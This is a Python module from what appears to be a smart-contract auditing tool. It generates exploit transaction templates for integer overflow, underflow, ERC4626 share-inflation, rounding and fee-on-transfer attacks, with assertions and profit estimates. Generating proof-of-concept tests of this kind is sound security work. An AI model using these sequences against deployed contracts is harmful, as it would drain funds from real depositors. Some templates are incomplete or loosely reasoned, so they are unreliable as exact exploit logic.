"""
IntegerMathSequenceBuilder — Phase 4.

Converts INTEGER_MATH attack hypotheses into transaction sequences.
"""

from __future__ import annotations

from zeropath.adversarial.models import AttackClass, AttackHypothesis
from zeropath.models import ProtocolGraph
from zeropath.sequencer.base import BaseSequenceBuilder
from zeropath.sequencer.models import AttackContext, CallerType, ProfitEstimate, TxCall


class IntegerMathSequenceBuilder(BaseSequenceBuilder):
    attack_class = AttackClass.INTEGER_MATH

    def _build_calls(
        self, hypothesis: AttackHypothesis, graph: ProtocolGraph
    ) -> list[TxCall]:
        title_lower = hypothesis.title.lower()

        if "overflow" in title_lower and "erc4626" not in title_lower and "inflation" not in title_lower:
            return self._overflow_sequence(hypothesis)
        if "underflow" in title_lower:
            return self._underflow_sequence(hypothesis)
        if "inflation" in title_lower or "erc4626" in title_lower:
            return self._share_inflation_sequence(hypothesis)
        if "rounding" in title_lower or "precision" in title_lower:
            return self._rounding_sequence(hypothesis)
        if "fee-on-transfer" in title_lower:
            return self._fee_on_transfer_sequence(hypothesis)
        return self._generic_math_sequence(hypothesis)

    def _overflow_sequence(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        target_contract = (hypothesis.contracts_involved or ["Token"])[0]
        return [
            self._call(
                step=1,
                description="Trigger integer overflow in balance tracking",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig="transfer(address,uint256)",
                calldata="address(this), type(uint256).max - currentBalance + 1",
                caller=CallerType.ATTACKER_EOA,
                pre=[
                    "uint256 currentBalance = IERC20(TARGET).balanceOf(address(this));",
                    "// With Solidity < 0.8: balance wraps to 0 or max",
                ],
                post=[
                    "// Balance should now be 0 (wrapped) or type(uint256).max (wrapped the other way)",
                ],
                gas=80_000,
            ),
            self._call(
                step=2,
                description="Transfer max uint256 balance out of overflowed account",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig="transfer(address,uint256)",
                calldata="address(this), type(uint256).max",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "uint256 newBal = IERC20(TARGET).balanceOf(address(this));",
                    "assertGt(newBal, 1e20, 'Overflow did not produce large balance');",
                ],
                gas=80_000,
            ),
        ]

    def _underflow_sequence(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        target_contract = (hypothesis.contracts_involved or ["Vault"])[0]
        target_fn = (hypothesis.functions_involved or ["withdraw"])[0]
        return [
            self._call(
                step=1,
                description="Withdraw more than current balance to trigger underflow",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig=f"{target_fn}(uint256)",
                calldata="type(uint256).max",
                caller=CallerType.ATTACKER_EOA,
                pre=[
                    "uint256 attackerBalBefore = address(this).balance;",
                    "// Solidity < 0.8: balance = 0 - type(uint256).max = 1 (underflow wrap)",
                ],
                post=[
                    "// Contract sends attacker all its ETH/tokens",
                    "assertGt(address(this).balance, attackerBalBefore, 'Underflow not exploited');",
                ],
                gas=200_000,
            ),
        ]

    def _share_inflation_sequence(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        target_contract = (hypothesis.contracts_involved or ["Vault"])[0]
        deposit_fn = next(
            (f for f in hypothesis.functions_involved if "deposit" in f.lower()),
            "deposit",
        )
        return [
            self._call(
                step=1,
                description="Deposit 1 wei as first depositor — receive 1 share",
                target=f"I{target_contract}(/* Vault address */)",
                sig=f"{deposit_fn}(uint256,address)",
                calldata="1, address(this)",
                caller=CallerType.ATTACKER_EOA,
                pre=[
                    "IERC20(ASSET).approve(address(vault), type(uint256).max);",
                    "uint256 sharesBefore = vault.totalSupply();",
                    "assertEq(sharesBefore, 0, 'Vault not empty — inflation attack requires empty vault');",
                ],
                post=[
                    "assertEq(vault.totalSupply(), 1, 'Did not receive exactly 1 share');",
                ],
                gas=150_000,
            ),
            self._call(
                step=2,
                description="Donate 1e18 tokens directly to vault (bypass deposit to avoid share mint)",
                target="IERC20(ASSET)",
                sig="transfer(address,uint256)",
                calldata="address(vault), 1e18",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "// totalAssets = 1 + 1e18; totalShares = 1",
                    "// convertToShares(1e18) = 1e18 * 1 / (1 + 1e18) ≈ 0 (rounds to 0)",
                    "assertEq(vault.totalSupply(), 1, 'Shares minted from donation — attack failed');",
                ],
                gas=80_000,
            ),
            self._call(
                step=3,
                description="Victim deposits 1e18 tokens — receives 0 shares (rounding exploit)",
                target=f"I{target_contract}(/* Vault address */)",
                sig=f"{deposit_fn}(uint256,address)",
                calldata="1e18, victim",
                caller=CallerType.ANY_EOA,
                post=[
                    "uint256 victimShares = vault.balanceOf(victim);",
                    "assertEq(victimShares, 0, 'Victim received shares — attack failed');",
                ],
                gas=150_000,
            ),
            self._call(
                step=4,
                description="Attacker redeems 1 share — receives all vault assets including victim's deposit",
                target=f"I{target_contract}(/* Vault address */)",
                sig="redeem(uint256,address,address)",
                calldata="1, address(this), address(this)",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "uint256 profit = IERC20(ASSET).balanceOf(address(this));",
                    "assertGt(profit, 1e18, 'Inflation attack did not capture victim deposit');",
                ],
                gas=200_000,
            ),
        ]

    def _rounding_sequence(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        target_contract = (hypothesis.contracts_involved or ["Protocol"])[0]
        target_fn = (hypothesis.functions_involved or ["calculateInterest"])[0]
        return [
            self._call(
                step=1,
                description="Execute many small operations that each round in attacker's favour",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig=f"{target_fn}(uint256)",
                calldata="1",  # smallest amount to maximize rounding effect
                caller=CallerType.ATTACKER_EOA,
                pre=[
                    "uint256 gainedFromRounding = 0;",
                    "// Repeat this call N times in a loop within the test",
                    "for (uint256 i = 0; i < 10_000; i++) {",
                ],
                post=[
                    "}",
                    "assertGt(gainedFromRounding, 0, 'No rounding profit accumulated');",
                ],
                gas=100_000,
            ),
        ]

    def _fee_on_transfer_sequence(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        target_contract = (hypothesis.contracts_involved or ["AMM"])[0]
        target_fn = (hypothesis.functions_involved or ["addLiquidity"])[0]
        return [
            self._call(
                step=1,
                description="Deposit fee-on-transfer token — AMM credits pre-fee amount",
                target=f"I{target_contract}(/* AMM address */)",
                sig=f"{target_fn}(/* TODO: AMM-specific params */)",
                calldata="feeToken, otherToken, amountFeeToken, amountOther, 0, 0, address(this), deadline",
                caller=CallerType.ATTACKER_EOA,
                pre=[
                    "uint256 balBefore = feeToken.balanceOf(address(amm));",
                ],
                post=[
                    "uint256 balAfter = feeToken.balanceOf(address(amm));",
                    "// AMM thinks it received amountFeeToken but actually received less",
                    "// Internal reserve > actual balance → can extract the gap",
                    "assertLt(balAfter - balBefore, amountFeeToken, 'No fee-on-transfer effect');",
                ],
                gas=400_000,
            ),
            self._call(
                step=2,
                description="Swap against inflated reserves to extract accounting gap",
                target=f"I{target_contract}(/* AMM address */)",
                sig="swap(uint256,uint256,address,bytes)",
                calldata="reserveGap, 0, address(this), ''",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "assertGt(IERC20(OTHER_TOKEN).balanceOf(address(this)), 0, 'Reserve gap extraction failed');",
                ],
                gas=300_000,
            ),
        ]

    def _generic_math_sequence(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        target_contract = (hypothesis.contracts_involved or ["Target"])[0]
        target_fn = (hypothesis.functions_involved or ["calculate"])[0]
        return [
            self._call(
                step=1,
                description=f"Trigger integer math vulnerability in {target_fn}()",
                target=f"I{target_contract}(/* {target_contract} address */)",
                sig=f"{target_fn}(/* TODO: params that trigger overflow/underflow */)",
                calldata="/* TODO: boundary values */",
                caller=CallerType.ATTACKER_EOA,
                post=["assertGt(address(this).balance, 0, 'Integer math exploit failed');"],
                gas=200_000,
            ),
        ]

    def _build_context(self, hypothesis, graph) -> AttackContext:
        ctx = super()._build_context(hypothesis, graph)
        ctx.requires_attacker_contract = False
        ctx.attacker_eth_balance = "10 ether"
        return ctx

    def _build_profit_estimate(self, hypothesis) -> ProfitEstimate | None:
        return ProfitEstimate(
            asset="ERC20",
            min_profit_expression="1e18",
            max_profit_expression="/* varies by vulnerability */",
            cost_expression="0",  # most integer attacks need no capital
            scales_with_tvl=False,
            notes="Integer math attacks often require zero capital beyond gas.",
        )
